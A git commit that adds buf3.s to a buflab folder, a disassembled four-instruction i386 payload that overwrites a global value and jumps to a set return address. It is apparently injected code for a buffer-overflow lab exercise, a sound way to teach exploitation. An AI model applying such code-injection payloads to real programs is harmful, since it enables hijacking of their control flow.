17c0ffd1c55a8fd6e629155b1baeaa69b688bd6a
Bekuuu <75431869+Bekuuu@users.noreply.github.com>
2021-05-02 15:17:06 +0800

    Create buf3.s

---
+++ buflab/buf3.s
@@ -0,0 +1,11 @@
+
+buf3.o：     文件格式 elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 48 60 94 65       	mov    $0x65946048,%eax
+   5:	a3 00 d1 04 08       	mov    %eax,0x804d100
+   a:	68 9d 8c 04 08       	push   $0x8048c9d
+   f:	c3                   	ret    
